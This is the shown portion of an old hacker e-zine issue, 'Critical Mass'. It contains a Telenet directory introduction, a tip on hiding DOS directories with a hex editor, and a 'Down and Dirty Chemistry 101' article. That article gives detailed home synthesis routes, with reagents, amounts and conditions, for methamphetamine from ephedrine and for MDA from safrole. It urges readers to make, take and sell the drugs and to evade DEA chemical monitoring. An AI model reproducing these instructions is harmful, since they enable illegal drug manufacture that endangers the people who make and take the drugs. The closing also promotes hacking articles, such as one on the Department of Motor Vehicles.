followed by a carriage return. 

        For more information on Telenet, I advise you to get 
Hacker's Unlimited issue#1 or LOD/H Technical Journal for more
information on Telenet. I did not wish to make this a text file on 
Telenet, but rather a directory of listings scanned by myself and 
fellow S.A.O.O members. 
        
        The "area" that is implied in this list basicly means that is the
overall area that was covered. Just because a machine was found in a scan
in a specific area does not always mean it IS in that area. At the bottom
of the list for "interconnecting" hosts.



        Part I consisted of the New York and half the Washington D.C. 
        area. In this issue is the rest of the D.C. along with 904, 
        305 and the 404. Please enjoy.

                             Hidding Directories
                             By Dementia Meister
                     ----------------------------------
                          
Here is how to really hide  directorys.  First off, you need a HEX-Editor,
like DISKEDIT.EXE from Norton Utilities v6.01(the one I recommend).  Then
you need a directory that you want to hide.  Warning:  Play/test this 
method out on a floppy first so you do not screw up your HD.  I have lost
many of data (my fault, by lack of knowledge).  This method is relatively
safe as long as you do not calibrate, speedisk, etc.. your HD.  Well back
to the task at hand, go into the HEX-Editor and find your DIR.  Now this
is  the tricky part.  Go to the DIR name and change it to an ext. only,
plus add the HIDDEN attribute to it.  Now almost nothing can find your
DIR, not NCD, not DOS, not anything BUT a HEX-Editor that you manually
go and find.  To UNHIDE the DIR, you go into the HEX-Editor find the
DIR change it to a legitamate name and wall-la<GRIN> you have it.

                   Welcome to Down and Dirty Chemistry 101

  
  This file is for those who wish to make drugs in thier own home, to sell 
or just to take. Unlike most how to files on dope manufacture, this one is
for people who are more worried about getting dope made than getting it 100%
pure and of pharmacutical quality. These methods are the quickest and most
simple around. You don't need a PhD. to make these compounds, but a little 
knowledge of chemistry is a must.
 
                            *  DISCLAIMER  *
  This where most people leave a message about how the file is for informa-
tional use only. BULLSHIT, if you are old enough to make these drugs then you 
are old enough to decide for yourself if you want to take them or not. I say
go right ahead, make 'em then take 'em. Yea it's illegal, so BE CAREFUL, but
if you aren't going to use this file then why keep it? pass it on to someone
who will, and scam some of thier first batch as an info retrieval fee.


                             TYRAMINE

  Tyramine is a fairly potent stimulant that is found naturally in cheese.
Don't even think about extracting it. It is easily made from the amino acid
tyrosine by decarboxilating it. Tyrosine is rather carefully watched by the 
DEA, so don't buy it from a chem. supply comany, no matter how much cheaper
it is there. It is available as the free form amino acid from most any health
food store.
  To decarboxilate the tyrosine at home, simply heat it with barium hydroxide
and seperate tyramine from the solution. Tyramine and tyrosine are both only
slighty soluble in water, so filtering with hot water should remove most of
the impurities and leave you with tyramine and unreacted tyrosine. The entire
synthesis could take place in a coffee pot.


                            
                            * MUSCIMOLE *

  This is another drug with a synthesis so easy, it is funny. It is the 
active compound in many old world mushrooms, and may well be the first drug
that early man tripped on. I have never tried it, but I heard that it can
cause a few unpleasent effects (muscle twitching, dizziness). It is still
legal in some states and ibotenic acid is fairly sfe to order from a supply
company.
  To make muscimole, reflux ibotenic acid in 10 times it's weight of water.

                          * METHAMPHETAMINE *

  Crank, crystal meth, wire: all words known and loved by speed freaks around
the world. This is the mother of all amphetamines, a small line will wire you
for 12 hours. There are many ways to go about making crank, if you have 
access to an organic chemistry lab. For those who don't, this may be the
simplest approach. This method uses ephedrine as the main precurser because
it is very similar in structure to crank. Look them both up and see.
  All you need to do is replace an OH group with a hydrogen atom.............
No Problem. Ephedrine is available from suppliers in the back of magazines 
(Penthouse, Cosmopoliton) for about $20 for 1,000 25mg tablets, just extract
the pure ephedrine out.
  Put a 2 liter flask into an ice bath with a stirrer in one neck and at 
least one neck to pour chemicals into. Add 360 ml chloroform, then 360 g of
phosphorus pentachloride and stir for 1/2 hour. Then add 240 g of ephedrine 
hydrochloride over 45 minutes, put in 60 ml more chloroform, and stir for 2
hours. Let the brew stand in ice for 45 min. and decant the juice off, DON'T
let the left over PCl5 come over, filter if any does. Add mineral spirits 
until the total volume is 4 liters, then let the chlorephedrine crystalize
in the freezer for an hour. Filter and dry your crystals.
  To make methamphetamine from chlorephadrine you must replace the Cl atom
with a hydrogen. There are many catalysts that will work, zinc is cheap and 
easy to get, but gives a rather low yield of speed. Palladium is probably the 
best way to go. 
  Take a champagne bottle, 2L is a good size, and wrap it in duct tape to be
safe. Add 50g anhydrous sodium acetate and 700ml of distilled water. Make a
buffer solution by adding acetic acid until the pH is 7. Add 2g of palladium
, either on charcoal or barium sulfate, then 125g of chlorephadrine. Attach
a cylender of H gas and increase to 30lbs pressure. Keep this pressure up 
for several hours, until H stops being absorbed. Stir with magnetic stirer
or if need be just shake it regularly over the whole time.
  Decant off the liquid and filter to remove the catalyst. make the solution 
strongly basic (pH 10-11) with NaOH and shake like hell for about 5 min. 
Extract with Benzene and discard the water layer. Fractional distillation
is required to seperate the chorephadrine from the meth, the meth comes over 
first followed immediatly by chlorephadrine. 
  Palladium black on charcoal is on the DEA watched chemical list, be careful
obtaining it. The Merk index should have a formula for making it. If you go 
with the zinc use about twice as many moles as you would with palladium.
 
 
                               *MDA*
  

  Ahh, the origional love drug! This is essentially the same as XTC, but as 
it is easier to make and stronger I will give this formula instead. 
  Safrole is the main precurser and can be obtained in sasafrass oil which
is available at any store that sells herbs, it is about 80% safrole by volume
and pure safrole can be distilled from the oil under a vacuum. When the 
distillate appears to be a homogenious oil, collect it in a clean flask, this
is safrole.
  In a glass vessel, in an ice bath, slowly add 450g concentrated sulfuric
acid to 400g acetonitrile. Keep the temperature under 10 degrees C while
making the addition. Take the mixture out of the ice bath and add 236g safrole
Stir occasionally and watch the temperature. When the solution reaches 80 deg.
C put the flask back in the ice bath and then pour into a gallon of ice water
with 18 oz NaOH in it. Stir while pouring.
  Decante the yellow oily layer on top into another flask. Add 10 times the 
volume of 10% KOH in 190 proof vodka. Reflux for 6 hours. Boil away most of 
the alcohol under a vacuum. Add water to dissolve the KOH and extract your
dope with benzene. Distill under a vacuum and collect the fraction coming
over at about 125 deg. C (at about 20 torr). Crystallize in your freezer, and 
filter. Dry the crystals. One "hit" is about 100mg. 


  This is all the space and time I have to write. Expect D$DChem II in the
next issue of Critical Mass. If you have any questions or comments you can 
reach me on any SAOO support bbs. Address mail to Art Phish. I would be happy
to include any synthesis that is requested in the next issue.

        Welp, that concludes yet another fine issue of Critical Mass. In 
 issue number 8, perpare yourself for the following......

        SAOO Telenet Directory Part III 
        Hacking The Department Of Motor Vec.
        More Chemistry, from Art Phish
        Probably a article on Telenet considering the resent questions
        I have received. 


                An much, much more! If you would like to be involved in
        computer conference, please leave The Beaver Email at one of the
        location given at the beging of this issue of Critical Mass.
        Until the next issue, chow... And Happy, Safe! hack'in. 


                If you have any article pretaining to not so often 
        talked about subjects, please E-mail the Beaver. Also, after
        the writing of "How to take DEC Servers Off the air", there
        seemed to be the misconception on why the article was produced. 
        It seems that some people believed that the article was put 
        out because I am "a bad person whom only likes destroying data".
        This is a pretty far fetched thing to say. Shortly after the
        articles release, I heard that a friend of mine at DOR <Dept.
        of Revenue> read that part and then secured there server more.
        That, my friend, was the purpose of the article. To get information
        out there, among the people. Till the next CM, I guess I will
        be seeing ya on the nets.... Chow!
